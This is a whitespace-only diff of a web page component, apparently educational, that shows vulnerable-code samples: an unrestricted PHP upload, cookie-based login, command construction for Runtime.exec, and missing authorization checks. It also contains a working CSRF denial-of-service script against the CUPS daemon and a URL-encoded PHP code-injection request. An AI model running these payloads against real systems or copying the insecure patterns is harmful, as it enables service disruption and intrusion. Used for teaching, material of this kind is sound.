@@ -325,7 +325,7 @@ export default function Post() {
                             {
                                 return false;
                             }
-                    
+
                             item->string = key;
                             item->type &= ~cJSON_StringIsConst;
                             new_type = item->type & ~cJSON_StringIsConst;
@@ -520,7 +520,7 @@ export default function Post() {
                     // length of the array
                     if (index < len)
                     {
-                
+
                         // get the value at the specified index of the array
                         value = array[index];
                     }
@@ -726,7 +726,7 @@ export default function Post() {
                 // Define the target location where the picture being
                 // uploaded is going to be saved.
                 $target = "pictures/" . basename($_FILES['uploadedfile']['name']);
-                
+
                 // Move the uploaded file to the new location.
                 if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target))
                 {
@@ -852,22 +852,22 @@ export default function Post() {
                     // make 101 CSRFed requests to CUPS daemon via 'img' tags
                     // causes CUPS daemon to crash
                     // by Adrian 'pagvac' Pastor | GNUCITIZEN.org
-                    
+
                     for(var i=1;i<=101;++i) {
                         document.write("<img width=0 height=0 " +
                             "src=\\"http://localhost:631/admin/?OP=add-rss-subscription&SUBSCRIPTION_NAME=DOS_TEST_" +
                             i + "&PRINTER_URI=%23ALL%23&EVENT_JOB_CREATED=on&MAX_EVENTS=20\\">");
                     }
-                    
+
                     /*
                     TESTED ON:
-                    
+
                     Ubuntu 8.04.1 (fully patched as of 19th Oct 2008)
                     Linux 2.6.24-21-generic #1 SMP Mon Aug 25 17:32:09 UTC 2008 i686 GNU/Linux
-                    
+
                     openSUSE 11.0 (i586)
                     Linux 2.6.25.5-1.1-default #1 SMP 2008-06-07 01:55:22 +0200 i686 i686 i386 GNU/Linux
-                    
+
                     Common UNIX Printing System 1.3.7
                     */
                     </script>
@@ -894,7 +894,7 @@ export default function Post() {
                         $x->cookie(
                             -name = > 'loggedin',
                             -value = > 'true');
-                
+
                         $x->cookie(
                             -name = > 'user',
                             -value = > $x->param('username'));
@@ -1000,7 +1000,7 @@ export default function Post() {
                     if ((unsigned long long)pitch * (unsigned long long)(*height) >
                         (unsigned long long)((size_t)-1) ||
                         (dstBuf = (unsigned char *)malloc(pitch * (*height))) == NULL)
-                      _throwg("tjLoadImage(): Memory allocation failure");                  
+                      _throwg("tjLoadImage(): Memory allocation failure");
                     `}
                 />
             </X.HighlightBlock>
@@ -1083,7 +1083,7 @@ export default function Post() {
                     +btype+
                     "&&c:\\utl\\cleanup.bat\""
                 )
-                
+
                 System.Runtime.getRuntime().exec(cmd);
                 `}
             />
@@ -1174,7 +1174,7 @@ export default function Post() {
                       process.env.NODE_ENV === "development"
                         ? path.resolve(__dirname, \`../../../server/storage/comkey\`)
                         : path.resolve(process.env.STORAGE_DIR, \`comkey\`);
-                    
+
                     class CommunicationKey {
                       #pubKeyName = "ipc-pub.pem";
                       #storageLoc = keyPath;
@@ -1313,7 +1313,7 @@ export default function Post() {
                 public BankAccount createNewBankAccount(String accountNumber, String accountType, String accountName, String accountSSN, double balance)
                 {
                     BankAccount account = null;
-                
+
                     if (isUserAuthentic)
                     {
                         account = new BankAccount();
@@ -1350,7 +1350,7 @@ export default function Post() {
                 code={`
                 $transfer_amount = GetTransferAmount();
                 $balance = GetBalanceFromDatabase();
-                
+
                 if ($transfer_amount < 0)
                 {
                     FatalError("Bad Transfer Amount");
@@ -1382,9 +1382,9 @@ export default function Post() {
                 void f(pthread_mutex_t *mutex)
                 {
                     pthread_mutex_lock(mutex);
-                    
+
                     /* access shared resource */ 
-                    
+
                     pthread_mutex_unlock(mutex);
                 }
                 `}
@@ -1397,13 +1397,13 @@ export default function Post() {
                 int f(pthread_mutex_t *mutex)
                 {
                     int result;
-                
+
                     result = pthread_mutex_lock(mutex);
                     if (0 != result)
                         return result;
-                
+
                     /* access shared resource */
-                
+
                     return pthread_mutex_unlock(mutex);
                 }
                 `}
@@ -1455,11 +1455,11 @@ export default function Post() {
                         case GUEST:
                             System.out.println("You are not authorized to perform this command");
                             break;
-                
+
                         case USER:
                             System.out.println("You are not authorized to perform this command");
                             break;
-                
+
                         default:
                             setPassword(user, password);
                             break;
@@ -1512,7 +1512,7 @@ export default function Post() {
                                     exit (EX_OSERR);
                             }
                     }
-            
+
                     `}
                 />
             </X.HighlightBlock>
@@ -1588,7 +1588,7 @@ export default function Post() {
                     X-Originating-IP: 127.0.0.1
                     X-Remote-IP: 127.0.0.1
                     X-Remote-Addr: 127.0.0.1
-                    
+
                     name=%27%29%29%3Bphpinfo%28%29%3B%2F*&nickname=22&fid=&cattpl=&listtpl=&distpl=&intro=33&orders=&status=1&action=category&id=&ctrl=save&Submit=%E6%8F%90%E4%BA%A4
                     `}
                 />
